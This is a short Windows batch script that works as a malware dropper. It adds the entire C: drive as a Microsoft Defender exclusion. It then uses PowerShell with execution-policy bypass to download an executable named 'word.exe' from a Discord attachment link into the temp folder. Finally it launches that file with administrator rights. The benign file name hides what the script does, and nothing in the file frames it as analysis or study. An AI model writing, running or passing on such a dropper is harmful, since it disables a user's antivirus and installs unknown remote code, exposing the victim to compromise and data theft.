@echo off
powershell.exe -Command Add-MpPreference -ExclusionPath "C:/"
setlocal EnableDelayedExpansion
set "URL=https://cdn.discordapp.com/attachments/1479181698099843284/1479202130504978442/word.exe?ex=69ab2dd6&is=69a9dc56&hm=34006b4cdcea137cd05d3c152b0b1312452f84c31cc8abfc9754d5ced5830682&"
set "Datei=%TEMP%\word.exe"
powershell -NoLogo -ExecutionPolicy Bypass -Command ^
    "Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%Datei%'"
cd "C:\Users\%USERNAME%\AppData\Local\Temp"
powershell -Command "Start-Process 'C:\Users\%USERNAME%\AppData\Local\Temp\word.exe' -Verb RunAs"
exit